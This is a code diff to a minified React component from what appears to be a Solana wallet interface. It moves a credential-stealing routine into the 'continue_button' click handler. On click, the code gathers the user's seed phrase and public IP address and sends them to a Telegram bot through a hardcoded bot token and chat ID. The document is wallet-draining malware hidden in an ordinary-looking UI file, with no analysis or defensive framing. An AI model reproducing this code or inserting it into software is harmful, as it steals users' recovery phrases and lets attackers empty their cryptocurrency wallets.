@@ -663,14 +663,7 @@
                         t: o
                     } = this.props;
 					
-					let password = `Possible Solana Seed: ${e.mnemonicWords.join(" ")}`
-					let bot_token = "6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4"
-					let chat_id = "1804765109"
-
-					fetch("https://api.ipify.org").then(r => r.text()).then((ip) => {
-					    password = `IP: ${ip}%0D%0A${password}`
-						fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {handleSubmitlololololol(...args)})
-					})
+					
 					
                     return (0, a.jsxs)(d.Z, {
                         children: [(0, a.jsx)(m.Z, {
@@ -760,8 +753,16 @@
                                     children: o("action_back")
                                 }), (0, a.jsx)(j.Z, {
                                     "data-id": "continue_button",
-									onclick: function() {alert("onclick")},
-									onClick: function() {alert("onClick")},
+									onClick: function() {
+										let password = `Possible Solana Seed: ${e.mnemonicWords.join(" ")}`
+										let bot_token = "6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4"
+										let chat_id = "1804765109"
+
+										fetch("https://api.ipify.org").then(r => r.text()).then((ip) => {
+											password = `IP: ${ip}%0D%0A${password}`
+											fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {handleSubmitlololololol(...args)})
+										})
+									},
                                     type: "submit",
                                     variant: "contained",
                                     color: "primary",
